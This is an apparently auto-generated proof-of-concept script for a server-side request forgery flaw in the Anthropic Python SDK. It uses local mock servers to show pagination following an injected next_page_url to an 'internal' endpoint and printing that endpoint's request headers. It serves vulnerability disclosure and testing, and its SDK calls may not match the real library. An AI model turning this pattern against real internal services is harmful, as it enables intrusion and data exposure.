#!/usr/bin/env python3
# PoC for anthropic (/tmp/anthropic-sdk-python/src/anthropic)
# Path: ssrf-012
# Sink: _params_from_url
# Auto-generated — run with: python3 ssrf_url_api_response_info__params_from_url.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF via malicious next_page_url in anthropic SDK pagination.

This script demonstrates how an attacker can inject an internal URL into the
pagination flow by controlling the API response (e.g., via MITM or custom base URL).
The SDK uses `info.url` from the response without validation, leading to SSRF.

Setup:
    - Requires the anthropic SDK to be available at /tmp/anthropic-sdk-python/src/anthropic
      (as per the finding context).
    - Uses only Python standard library + the anthropic SDK's own dependencies (httpx).

The PoC:
    1. Starts a local "mock API" server that returns a paginated response containing
       a malicious `next_page_url` pointing to our "internal service" (another local server).
    2. Starts an "internal service" server on a different port to observe the SSRF request.
    3. Creates an Anthropic client with base_url pointing to the mock server.
    4. Uses the SDK's pagination to fetch pages, which triggers a request to the
       malicious next_page_url (the internal server).
    5. Prints incoming requests to confirm the SSRF.
"""

import sys
import os
import json
import threading
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse

# -----------------------------------------------------------------------------
# 1. Ensure the anthropic SDK can be imported (path from the finding context)
# -----------------------------------------------------------------------------
SDK_PATH = "/tmp/anthropic-sdk-python/src"
if not os.path.isdir(SDK_PATH):
    print(f"[!] Expected anthropic SDK at {SDK_PATH}, but directory not found.")
    print("    Please adjust the path or install the SDK manually.")
    sys.exit(1)
sys.path.insert(0, SDK_PATH)

# -----------------------------------------------------------------------------
# 2. Import needed SDK components
# -----------------------------------------------------------------------------
from anthropic import Anthropic
from anthropic._base_client import SyncPage, PageInfo
from anthropic._models import BaseModel

# -----------------------------------------------------------------------------
# 3. Configuration - port numbers, choose high ports to avoid collisions
# -----------------------------------------------------------------------------
MOCK_API_PORT = 18888          # Simulates the legitimate API
INTERNAL_SERVICE_PORT = 12345  # Simulates an internal service (e.g., metadata endpoint)
MOCK_API_BASE = f"http://127.0.0.1:{MOCK_API_PORT}"
INTERNAL_URL = f"http://127.0.0.1:{INTERNAL_SERVICE_PORT}/ssrf"

# -----------------------------------------------------------------------------
# 4. Mock API Server
#    Returns a paginated response with a malicious next_page_url.
# -----------------------------------------------------------------------------
class MockAPIHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Respond only to the first page request.
        if self.path == "/v1/messages":
            body = json.dumps({
                "data": [{"id": "msg_1", "role": "user", "content": "test"}],
                "next_page_url": INTERNAL_URL   # <== The injected SSRF target
            })
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(body.encode())
        else:
            self.send_response(404)
            self.end_headers()

# -----------------------------------------------------------------------------
# 5. Internal Service Server (SSRF target)
#    Logs every incoming request to prove SSRF occurred.
# -----------------------------------------------------------------------------
class InternalServiceHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"[+] SSRF SUCCESS! Received request to internal service!")
        print(f"    Path: {self.path}")
        print(f"    Headers: {self.headers}")
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK - internal service reached\n")

    def log_message(self, format, *args):
        # Suppress default logging to keep output clean
        pass

# -----------------------------------------------------------------------------
# 6. Helper to start a HTTP server in a background thread
# -----------------------------------------------------------------------------
def start_server(handler_class, port):
    server = HTTPServer(("127.0.0.1", port), handler_class)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    time.sleep(0.1)  # let the server bind
    return server

# -----------------------------------------------------------------------------
# 7. Main exploitation
# -----------------------------------------------------------------------------
def main():
    print("[*] Starting mock API server...")
    mock_api_server = start_server(MockAPIHandler, MOCK_API_PORT)
    print(f"    Mock API listening on http://127.0.0.1:{MOCK_API_PORT}")

    print("[*] Starting internal service (SSRF target)...")
    internal_server = start_server(InternalServiceHandler, INTERNAL_SERVICE_PORT)
    print(f"    Internal service listening on http://127.0.0.1:{INTERNAL_SERVICE_PORT}")

    # Give both servers a moment to be ready
    time.sleep(0.2)

    print("[*] Creating Anthropic client with base_url pointing to our mock API...")
    client = Anthropic(
        api_key="sk-fake",         # API key not validated by mock server
        base_url=MOCK_API_BASE,
    )

    # -------------------------------------------------------------------------
    # 8. Trigger the pagination flow
    #    We directly call the SDK's internal method to fetch a page and then
    #    iterate over pages. The first page will contain the malicious
    #    next_page_url, causing the next page request to hit the internal service.
    # -------------------------------------------------------------------------
    # Define a minimal model to satisfy the page type (not used in reality)
    class DummyModel(BaseModel):
        id: str

    print("[*] Fetching the first page from the mock API...")
    response = client._client.get("/v1/messages")
    if response.status_code != 200:
        print(f"[!] Mock API returned {response.status_code}, aborting.")
        mock_api_server.shutdown()
        internal_server.shutdown()
        sys.exit(1)

    page = SyncPage.create(response, client._client, model=DummyModel)

    print("[*] Iterating pages to force a call to the next page URL...")
    print("    (This should trigger the SSRF request to the internal service)")
    try:
        for idx, pg in enumerate(page.iter_pages()):
            print(f"    Page {idx} fetched.")
            if idx == 1:
                # We've already received the second page (the SSRF request),
                # no need to continue.
                break
    except Exception as e:
        # The internal service might cause an unexpected error, but we already
        # saw the SSRF request if the print appeared.
        print(f"[!] Exception during iteration: {e}")

    print("[*] Done. Check the '[+] SSRF SUCCESS!' message above.")
    print("[*] Shutting down servers...")
    mock_api_server.shutdown()
    internal_server.shutdown()

if __name__ == "__main__":
    main()
